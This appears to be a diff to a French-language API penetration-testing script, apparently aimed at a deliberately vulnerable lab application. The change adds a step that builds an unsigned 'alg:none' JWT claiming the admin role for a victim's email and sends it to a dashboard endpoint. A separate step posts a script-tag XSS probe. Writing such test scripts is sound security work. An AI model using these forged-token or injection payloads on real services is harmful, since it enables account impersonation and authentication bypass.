@@ -38,9 +38,12 @@ if [ -n "$TOKEN_A" ]; then
   echo "  → vérifier : alg, exp (expiration), role/email (données sensibles)"
 fi
 
-echo "[2.3] Signature altérée → doit être REJETÉE (401/403)"
-curl -s -o /dev/null -w '  [HTTP %{http_code}] (attendu 401/403)\n' \
-  "$BASE/identity/api/v2/user/dashboard" -H "Authorization: Bearer ${TOKEN_A}TAMPER"
+echo "[2.3] Forge JWT alg:none (usurpation) → le serveur DOIT rejeter (sinon CRITIQUE)"
+NONE_HDR=$(printf '{"alg":"none","typ":"JWT"}' | base64 | tr '+/' '-_' | tr -d '=')
+FORGED=$(printf '{"sub":"%s","role":"admin","exp":9999999999}' "${VICTIM_EMAIL:-test@example.com}" | base64 | tr '+/' '-_' | tr -d '=')
+echo "  réponse pour le compte usurpé ${VICTIM_EMAIL:-test@example.com} :"
+show "$BASE/identity/api/v2/user/dashboard" -H "Authorization: Bearer ${NONE_HDR}.${FORGED}."
+echo "  → HTTP 200 = signature NON vérifiée → bypass d'auth (V1, CRITIQUE)"
 
 hr "PHASE 3 — BOLA / Broken Access Control"
 echo "[3.1] User A lit son dashboard"
@@ -66,7 +69,8 @@ echo "[5.1] Poster un commentaire/post avec <script>"
 show -X POST "$BASE/community/api/v2/community/posts" \
   -H "Authorization: Bearer $TOKEN_A" $J \
   -d '{"title":"pentest","content":"<script>alert(1)</script>"}'
-echo "  → vérifier ensuite le rendu côté SPA (réflexion non échappée)"
+echo "  → NB : l'API encode le contenu (&lt;script&gt;). Vérifier le rendu DOM"
+echo "    côté SPA (innerHTML) pour un éventuel XSS client — non confirmé via l'API."
 
 hr "PHASE 6 — Misconfiguration / headers"
 echo "[6.1] Headers de sécurité + CORS"
